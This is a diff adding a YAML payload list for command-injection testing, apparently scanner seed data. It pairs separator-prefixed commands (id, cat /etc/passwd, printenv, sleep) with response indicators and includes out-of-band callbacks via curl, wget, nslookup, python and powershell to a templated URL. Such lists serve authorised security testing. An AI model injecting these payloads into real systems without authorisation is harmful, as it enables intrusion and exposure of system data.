@@ -1,0 +1,69 @@
+# CMDi payload expansion: more commands, separators, OOB variants
+seeds:
+  cmdi:
+    output:
+      - raw: "; id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "| id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "; whoami"
+        indicator: None
+        ctx: ["all"]
+      - raw: "; uname -a"
+        indicator: "Linux"
+        ctx: ["all"]
+      - raw: "; cat /etc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "; echo PWNED_2718"
+        indicator: "PWNED_2718"
+        ctx: ["all"]
+      - raw: "; ls -la /"
+        indicator: "root"
+        ctx: ["all"]
+      - raw: "; netstat -an"
+        indicator: "LISTEN"
+        ctx: ["all"]
+      - raw: "; ps aux"
+        indicator: "PID"
+        ctx: ["all"]
+      - raw: "; printenv"
+        indicator: "PATH="
+        ctx: ["all"]
+      - raw: "; type C:\\Windows\\win.ini"
+        indicator: "[fonts]"
+        ctx: ["all"]
+      - raw: "& tasklist &"
+        indicator: "Image Name"
+        ctx: ["all"]
+      - raw: "| ipconfig"
+        indicator: "IPv4"
+        ctx: ["all"]
+    time:
+      - raw: "; sleep 4"
+        threshold: 3.0
+        ctx: ["all"]
+      - raw: "; ping -c 4 127.0.0.1"
+        threshold: 3.0
+        ctx: ["all"]
+      - raw: "& timeout 4 &"
+        threshold: 3.0
+        ctx: ["all"]
+    blind_oob:
+      - raw: "; nslookup {{oob_domain}}"
+        type: "dns"
+        ctx: ["all"]
+      - raw: "; curl {{oob_url}}"
+        type: "http"
+        ctx: ["all"]
+      - raw: "; wget {{oob_url}}"
+        type: "http"
+        ctx: ["all"]
+      - raw: "; python3 -c 'import urllib.request; urllib.request.urlopen(\\\"{{oob_url}}\\\")'"
+        type: "http"
+        ctx: ["all"]
+      - raw: "; powershell -Command \\\"Invoke-WebRequest {{oob_url}}\\\""
+        type: "http"
+        ctx: ["all"]
